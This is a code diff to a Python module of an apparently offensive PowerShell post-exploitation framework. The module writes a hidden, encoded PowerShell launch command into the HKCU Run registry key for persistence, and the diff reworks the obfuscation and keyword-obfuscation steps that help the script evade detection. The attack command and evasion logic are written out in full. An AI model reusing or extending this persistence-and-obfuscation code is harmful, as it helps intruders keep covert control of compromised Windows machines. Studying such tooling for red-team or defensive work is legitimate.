@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import pathlib
 import os
 from builtins import object
 from builtins import str
@@ -66,7 +67,8 @@ class Module(object):
             script = data_util.keyword_obfuscation(script)
 
         if obfuscate:
-            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
+            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
+            script = data_util.keyword_obfuscation(script)
             return script
         
         if ext_file != '':
@@ -149,10 +151,9 @@ class Module(object):
         script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + key_name + " -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=" + location_string + ";powershell -Win Hidden -enc $x\"';"
         
         script += "'Registry persistence established " + status_msg + "'"
-        script = data_util.keyword_obfuscation(script)
-        if obfuscate:
-            script = helpers.obfuscate(main_menu.installPath, psScript=script,
-                                       obfuscationCommand=obfuscation_command)
+
+        if main_menu.obfuscate:
+            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
         script = data_util.keyword_obfuscation(script)
 
         return script
